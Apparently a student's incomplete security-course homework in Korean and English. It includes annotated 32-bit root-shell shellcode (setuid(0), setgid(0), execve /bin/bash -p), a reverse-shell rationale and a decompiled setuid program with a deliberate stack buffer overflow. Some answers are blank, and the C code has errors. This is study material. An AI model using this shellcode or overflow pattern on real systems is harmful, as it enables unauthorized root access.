


# Problem 1

ubunut의 튜토리얼(https://help.ubuntu.com/community/DataRecovery)을 기초로 해서 `foremost`라는 tool을 사용했다.

# Problem 2

(a)

`/usr/src/linux-headers-4.9.0-3-686/arch/x86/include/generated/uapi/asm/unistd_32.h`

`/usr/src/linux-headers-4.9.0-3-686/arch/x86/include/generated/uapi/asm/unistd_64.h`

(b) `/usr/src/linux-headers-4.9.0-3-common/include/uapi/asm-generic/unistd.h` 

(c) `repe`는 string instruction에 붙어서 repeat until equal을 수행한다. 따라서 ZF플래그가 0인 동안 계속 수행된다. 그래서 `repe scasb`는 find non-AL byte starting at ES:[EDI]가 된다. EAX만큼 수행..

(d)

(g) jjj

```asm
 560:   31 c0                   xor    %eax,%eax         # clear eax
 562:   31 db                   xor    %ebx,%ebx         # clear ebx
 564:   b0 17                   mov    $0x17,%al         # 0x17 = setuid
 566:   cd 80                   int    $0x80             # setuid(0)
 568:   31 c0                   xor    %eax,%eax         # clear eax
 56a:   31 db                   xor    %ebx,%ebx         # clear ebx
 56c:   b0 2e                   mov    $0x2e,%al         # 0x2e = setgid
 56e:   cd 80                   int    $0x80             # setgid(0)
 570:   31 c0                   xor    %eax,%eax         # clear eax
 572:   b0 0b                   mov    $0xb,%al          # 0x0b = execve
 574:   31 d2                   xor    %edx,%edx         # clear edx
 576:   52                      push   %edx              # '\0'
 577:   66 68 2d 70             pushw  $0x702d           # "-p"
 57b:   89 e1                   mov    %esp,%ecx         # ecx = "-p"
 57d:   52                      push   %edx              # '\0'
 57e:   6a 68                   push   $0x68             #
 580:   68 2f 62 61 73          push   $0x7361622f       #
 585:   68 2f 62 69 6e          push   $0x6e69622f       # "/bin/bash"
 58a:   89 e3                   mov    %esp,%ebx         # ebx = "/bin/bash"
 58c:   52                      push   %edx              # NULL}
 58d:   51                      push   %ecx              # "-p",
 58e:   53                      push   %ebx              # {"/bin/bash",
 58f:   89 e1                   mov    %esp,%ecx         # ecx = {"/bin/bash", "-p", NULL}
 591:   cd 80                   int    $0x80             # execve()
```

64-bit ABI

To make a system call in 64-bit Linux, place the system call number in rax, then its arguments, in order, in rdi, rsi, rdx, r10, r8, and r9, then invoke syscall.

# Problem 3

(a) inbound는 웹서버로 들어가는 통신을 막는다. 따라서 웹서버가 미리 만들어놓은 서버에 접근하게끔 하는 reverse shell방식을 사용해야 한다.

(b)

```

```

(c)

```
```

# Problem 4



# Problem 5

(a)

(b) `setlev`의 실행권한으로 flag를 읽어들이는 명령어를 수행해야 한다.

(c)

```c
char* something(char* buf, char* b){
    int i = 0;
    while(1){
        if(b[i] == '\0') break;
        buf[i] = b[i];
        i++;
    }
    buf[i] = '\0';
    return buf;
}
int parseAndSet(char* a, char* b){
    char buf[8];
    if(strcmp(b, "help")==0){
        printf("%s [opts] --level=", a);
    }
    if(strcmp(b, "level=", 6)==0){
        something(buf, b+6);
        printf("", b);
    }
}
int main(int argc, char* argv[]){
    if(argc<=1) return -1;
    if(strncmp(argv[1], "--", 2)==0)
        parseAndSet(argv[0], argv[1]+2);
    return 0;
}
```
